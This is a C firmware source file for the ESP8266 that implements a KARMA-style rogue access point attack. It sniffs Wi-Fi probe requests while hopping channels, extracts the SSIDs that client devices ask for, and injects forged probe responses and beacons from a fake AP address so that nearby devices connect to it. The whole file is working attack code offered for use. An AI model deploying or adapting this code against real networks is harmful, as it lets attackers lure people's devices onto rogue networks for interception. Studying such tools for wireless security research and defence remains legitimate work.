#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "mem.h"
#include "user_interface.h"
#include "driver/uart.h"

#define user_procTaskPrio        0
#define user_procTaskQueueLen    1
os_event_t    user_procTaskQueue[user_procTaskQueueLen];

#define CHANNEL_HOP_INTERVAL 2500
uint8_t channel = 7;
uint16_t seq_n = 0;
uint8_t packet_buffer[64];
static volatile os_timer_t chanhop_timer;

#define TYPE_MANAGEMENT       0x00
#define TYPE_CONTROL          0x01
#define TYPE_DATA             0x02
#define SUBTYPE_ASSOC_REQUEST 0x00
#define SUBTYPE_PROBE_RESPONSE 0x05
#define SUBTYPE_PROBE_REQUEST 0x04

// we "win" when we're able to try to connect
// to forge_ap.
uint8_t forge_ap[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
uint8_t forge_timestamp[8] = {0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0};

/* ==============================================
 * Promiscous callback structures, see ESP manual
 * ============================================== */
 
struct RxControl {
    signed rssi:8;
    unsigned rate:4;
    unsigned is_group:1;
    unsigned:1;
    unsigned sig_mode:2;
    unsigned legacy_length:12;
    unsigned damatch0:1;
    unsigned damatch1:1;
    unsigned bssidmatch0:1;
    unsigned bssidmatch1:1;
    unsigned MCS:7;
    unsigned CWB:1;
    unsigned HT_length:16;
    unsigned Smoothing:1;
    unsigned Not_Sounding:1;
    unsigned:1;
    unsigned Aggregation:1;
    unsigned STBC:2;
    unsigned FEC_CODING:1;
    unsigned SGI:1;
    unsigned rxend_state:8;
    unsigned ampdu_cnt:8;
    unsigned channel:4;
    unsigned:12;
};
 
struct LenSeq {
    uint16_t length;
    uint16_t seq;
    uint8_t  address3[6];
};

struct sniffer_buf {
    struct RxControl rx_ctrl;
    uint8_t buf[36];
    uint16_t cnt;
    struct LenSeq lenseq[1];
};

struct sniffer_buf2{
    struct RxControl rx_ctrl;
    uint8_t buf[112];
    uint16_t cnt;
    uint16_t len;
};

int tag_supportedSSID(uint8_t *buf,int posn,uint8_t *orig_ssid,int orig_ssidlen)
{
  uint8_t *internal_buf = buf + posn;
  int i = 0;
  int l = 0;
  internal_buf[++l] = 0x00;
  internal_buf[++l] = orig_ssidlen;
  for(i = 0;i < orig_ssidlen;i++)
  {
    internal_buf[++l] = orig_ssid[i];
  }
  return l;
}

// this should only be used with pkt_buf from proberesp
// don't be a shitlord with this.
void convert_probe_to_beacon(uint8_t *buf)
{
  int i = 0;
  buf[0] = 0x80;
  for (i=0; i<6; i++) buf[i+4] = 0xFF;
}

int tag_supportedRates(uint8_t *buf,int posn)
{
  uint8_t *internal_buf = buf + posn;
  int l = 0;
  internal_buf[++l] = 0x01;
  internal_buf[++l] = 0x08;
  internal_buf[++l] = 0x02;
  internal_buf[++l] = 0x04;
  internal_buf[++l] = 0x0b;
  internal_buf[++l] = 0x16;
  internal_buf[++l] = 0x24;
  internal_buf[++l] = 0x30;
  internal_buf[++l] = 0x48;
  internal_buf[++l] = 0x6c;
  return l;
}

int tag_supportedChannels(uint8_t *buf,int posn)
{
  uint8_t *internal_buf = buf + posn;
  int l = 0;
  internal_buf[++l] = 0x03;
  internal_buf[++l] = 0x01;
  internal_buf[++l] = 0x07;
  return l;
}

int tag_ERPInformation(uint8_t *buf,int posn)
{
  /*
    from wireshark. not too sure why this is
    sent twice?
  */
  uint8_t *internal_buf = buf + posn;
  int l = 0;
  internal_buf[++l] = 0x2a; // type 1 erp information
  internal_buf[++l] = 0x01;
  internal_buf[++l] = 0x04; // barker preamble mode
  internal_buf[++l] = 0x2f; // type 2 erp information
  internal_buf[++l] = 0x01; 
  internal_buf[++l] = 0x04; // barker preamble mode
  return l;
}

int tag_extendedSupportedRates(uint8_t *buf, int posn)
{
  uint8_t *internal_buf = buf + posn;
  int l = 0;
  internal_buf[++l] = 0x32; 
  internal_buf[++l] = 0x08; 
  internal_buf[++l] = 0x0c; // 6
  internal_buf[++l] = 0x12; // 9
  internal_buf[++l] = 0x18; // 12
  internal_buf[++l] = 0x24;
  internal_buf[++l] = 0x30;
  internal_buf[++l] = 0x48;
  internal_buf[++l] = 0x60; 
  internal_buf[++l] = 0x6c;
  return l;  
}

// we have to reply to each tag the parent expects
uint16_t proberesp(uint8_t *buf, uint8_t *client, uint8_t *ap, uint16_t seq,uint8_t ssid_len, char *ssid)
{
    int i=0;

    buf[0] = 0x50; // probe_response
    buf[1] = 0x00;
    // duration - doesn't matter.
    buf[2] = 0x00;
    buf[3] = 0x00;
    // client AP.
    for (i=0; i<6; i++) buf[i+4] = client[i];
    // Sender
    for (i=0; i<6; i++) buf[i+10] = ap[i];
    for (i=0; i<6; i++) buf[i+16] = ap[i];
    // Seq_n
    buf[22] = seq % 0x100; // bug in original karma source
    buf[23] = seq / 0x100;
    for(i = 0;i < 8;i++) buf[i+24] = forge_timestamp[i]; // fuck the timestamp
    buf[32] = 0x64; // beacon interval - copied from wireshark
    buf[33] = 0x00;
    buf[34] = 0x01; // wifi capabilities
    buf[35] = 0x00;
    int newPosn = 35 + tag_supportedSSID(buf,35,ssid,ssid_len);
    newPosn += tag_supportedRates(buf,newPosn);
    newPosn += tag_supportedChannels(buf,newPosn);
    newPosn += tag_ERPInformation(buf,newPosn);
    newPosn += tag_extendedSupportedRates(buf,newPosn);
    return newPosn + 1;
}

/* Listens communication between AP and client */
static void ICACHE_FLASH_ATTR
promisc_cb(uint8_t *buf, uint16_t len)
{
    if (len == 12){
        struct RxControl *sniffer = (struct RxControl*) buf;
    } else if (len != 128) {
        struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
    } 
    else {
        struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
        unsigned int frameControl = ((unsigned int)sniffer->buf[1] << 8) + sniffer->buf[0];
        unsigned int version      = (frameControl & 0b0000000000000011) >> 0;
        unsigned int frameType    = (frameControl & 0b0000000000001100) >> 2;
        unsigned int frameSubType = (frameControl & 0b0000000011110000) >> 4;
        unsigned int toDS         = (frameControl & 0b0000000100000000) >> 8;
        unsigned int fromDS       = (frameControl & 0b0000001000000000) >> 9;
        int i=0;
        // os_printf("FC:%04x :: %02x:%02x\n",frameControl,frameType,frameSubType);
        if(frameType == TYPE_MANAGEMENT && frameSubType == SUBTYPE_ASSOC_REQUEST)
        {
            i = 0;
            os_printf("ASSOCIATE REQUEST to %02x:%02x:%02x:%02x:%02x:%02x\n",sniffer->buf[i+4],sniffer->buf[i+5],sniffer->buf[i+6],sniffer->buf[i+7],sniffer->buf[i+8],sniffer->buf[i+9]);
        }
	      else if(frameType == TYPE_MANAGEMENT && frameSubType == SUBTYPE_PROBE_REQUEST)
	      {
          if(sniffer->buf[0x19] == 0)
          {
            i = 6;
            // os_printf("BROADCAST PROBE from %02x:%02x:%02x:%02x:%02x:%02x\n",sniffer->buf[i+4],sniffer->buf[i+5],sniffer->buf[i+6],sniffer->buf[i+7],sniffer->buf[i+8],sniffer->buf[i+9]);
          }
          else{
            char pkt_buf[512];
            char ssid[128];
            uint8_t ssidLength = sniffer->buf[i+0x19];
            int x = 0;
            for(x = 0;x < sniffer->buf[i+0x19];x++)
            {
              ssid[x] = sniffer->buf[i+0x1a+x];
            }
            i = 6;
            // os_printf("FREEHEAP:%x\n",system_get_free_heap_size());
            uint16_t seqnPacket = (((unsigned int)sniffer->buf[23] << 8) + sniffer->buf[22] ) >> 4;
            uint16_t newSeqnPacket = ((seqnPacket + 0x10) << 4) & 0xFFF0;
            os_printf("ORIGINAL: %02x%02x XLAT: %d FORGED: %04x\n",sniffer->buf[22],sniffer->buf[23],seqnPacket,newSeqnPacket);
            uint16_t size = proberesp(pkt_buf,(sniffer->buf + 10),forge_ap,newSeqnPacket,ssidLength,ssid);
            // avoids off-by-one in ssid name in proberesp.
            ssid[x] = 0;
            os_printf("DIRECTED PROBE REQUEST from %02x:%02x:%02x:%02x:%02x:%02x (SSID:%s) (SEQN:%d)\n",sniffer->buf[i+4],sniffer->buf[i+5],sniffer->buf[i+6],sniffer->buf[i+7],sniffer->buf[i+8],sniffer->buf[i+9],ssid,seqnPacket);
            wifi_send_pkt_freedom(pkt_buf,size,0);
            convert_probe_to_beacon(pkt_buf);
            wifi_send_pkt_freedom(pkt_buf,size,0);
          }
        }
        else if(frameType == TYPE_MANAGEMENT && frameSubType == SUBTYPE_PROBE_RESPONSE)
        {
          if(sniffer->buf[24] != 0)
          {
            // lol
            i = 0;
            for(i = 0;i < 8;i++) forge_timestamp[i] = sniffer->buf[24+i];
          }
        }
    }
}

void ICACHE_FLASH_ATTR
sniffer_system_init_done(void)
{
    // Set up promiscuous callback
    wifi_set_channel(channel);
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_enable(1);
}

void channelhop(void *arg)
{
    // channel = 1 + (channel + 1) % 12; // no such thing as chan0
    channel = 1 + (channel++ % 12);
    os_printf("Hopping to channel %d\n", channel);
    wifi_set_channel(channel);
}

void ICACHE_FLASH_ATTR
user_init()
{
    uart_init(115200, 115200);

    wifi_set_opmode(STATION_MODE);
    os_timer_disarm(&chanhop_timer);
    os_timer_setfn(&chanhop_timer, (os_timer_func_t *) channelhop, NULL);
    os_timer_arm(&chanhop_timer, CHANNEL_HOP_INTERVAL, 1);
    system_init_done_cb(sniffer_system_init_done);
}
